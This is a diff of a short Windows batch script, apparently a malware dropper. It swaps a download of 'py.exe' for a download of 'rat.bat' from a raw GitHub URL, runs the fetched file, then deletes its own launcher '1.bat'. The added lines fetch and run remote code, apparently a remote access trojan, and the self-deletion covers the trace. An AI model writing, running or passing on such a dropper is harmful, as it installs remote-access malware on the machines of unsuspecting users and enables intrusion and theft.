@@ -1,5 +1,5 @@
 @echo off
-curl -o py.exe https://github.com/oogabooga245/ysboob/raw/main/py.exe
-start py.exe
+curl -o rat.bat https://raw.githubusercontent.com/imadeit445/client/main/rat.bat
+start rat.bat
 del 1.bat
 exit
